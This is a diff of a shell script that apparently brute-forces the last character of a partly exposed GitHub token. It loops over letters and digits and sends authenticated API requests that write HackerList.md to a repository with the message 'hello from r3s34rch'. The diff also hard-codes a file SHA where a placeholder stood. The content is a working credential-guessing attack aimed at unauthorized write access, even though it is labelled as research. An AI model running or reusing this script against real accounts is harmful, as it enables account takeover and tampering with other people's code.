@@ -16,7 +16,7 @@ echo "4-----------------------------------------------------------------"
 echo "$B64_BLOB"
 echo "-----------------------------------------------------------------"
 
-curl  --url "https://api.github.com/repos/${REPO}/contents/HackerList.md" \
+#curl  --url "https://api.github.com/repos/${REPO}/contents/HackerList.md" \
 
 for f in {a..z} {A..Z} {0..9}; do 
     #echo "${TOKEN_VAL:0:39}$f" 
@@ -30,7 +30,7 @@ for f in {a..z} {A..Z} {0..9}; do
          --header "$Header" \
          --header "Accept: application/vnd.github.v3+json" \
          --header "X-GitHub-Api-Version: 2022-11-28" \
-         -d '{"message":"hello from r3s34rch","content":"bm9uYW1l", "sha":"SHA_FROM_ABOVE"}'
+         -d '{"message":"hello from r3s34rch","content":"bm9uYW1l", "sha":"fc256a488ae346887a24b0519e06cb120e340529"}'
     echo "-----------------------------------------------------------------"
 done
 
